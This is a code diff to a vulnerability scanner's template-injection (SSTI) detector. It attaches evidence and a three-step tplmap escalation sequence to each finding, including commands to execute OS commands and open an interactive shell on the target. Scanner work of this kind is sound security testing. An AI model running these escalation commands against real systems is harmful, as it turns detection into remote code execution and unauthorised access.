@@ -14,7 +14,7 @@ from __future__ import annotations
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from scanner.engine import Finding, Severity, ScanEngine
-from scanner.vulns._common import Injector, is_safe_mode, iter_injectors
+from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors
 
 MODULE = "ssti_detect"
 
@@ -33,7 +33,21 @@ _PROBES: list[tuple[str, str]] = [
 ]
 
 
-def _finding(inj: Injector, payload: str, engine_name: str) -> Finding:
+def _exploitation_steps(inj: Injector, payload: str) -> list[dict]:
+    """The tplmap kill chain to weaponise a confirmed SSTI into RCE. Authorised targets only."""
+    target = (inj.proof(payload) if inj.proof else None) or inj.url or "<injectable request>"
+    return [
+        {"step": 1, "description": "Confirm SSTI and fingerprint the template engine.",
+         "command": f'tplmap -u "{target}"'},
+        {"step": 2, "description": "Execute a single OS command through the template.",
+         "command": f'tplmap -u "{target}" --os-cmd "id"'},
+        {"step": 3, "description": "Open an interactive shell via the template engine.",
+         "command": f'tplmap -u "{target}" --os-shell'},
+    ]
+
+
+def _finding(inj: Injector, payload: str, engine_name: str,
+             proof_lines: list[str] | None = None) -> Finding:
     proof_url = inj.proof(payload) if inj.proof else None
     tplmap = f'tplmap -u "{proof_url}"' if proof_url else None
     return Finding(
@@ -47,7 +61,9 @@ def _finding(inj: Injector, payload: str, engine_name: str) -> Finding:
         recommendation=("Never render user input as a template. Use logic-less templates or a sandbox, "
                         "and pass user data only as bound variables — never concatenated into the template."),
         raw={"location": inj.label, "parameter": inj.param, "engine": engine_name,
-             "payload": payload, "proof_url": proof_url, "tplmap": tplmap, "confidence": "high"},
+             "payload": payload, "proof_url": proof_url, "tplmap": tplmap, "confidence": "high",
+             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
+             "exploitation": _exploitation_steps(inj, payload)},
     )
 
 
@@ -56,7 +72,9 @@ def _test(inj: Injector) -> Finding | None:
         resp = inj.inject(payload)
         # Evaluated if the product is present but the literal expression is not echoed back.
         if resp is not None and _PRODUCT in resp.text and _EXPR not in resp.text:
-            return _finding(inj, payload, engine_name)
+            return _finding(inj, payload, engine_name,
+                            evidence(inj, payload, resp,
+                                     indicator=f"template evaluated {_EXPR} → {_PRODUCT} in response"))
     return None
 
 
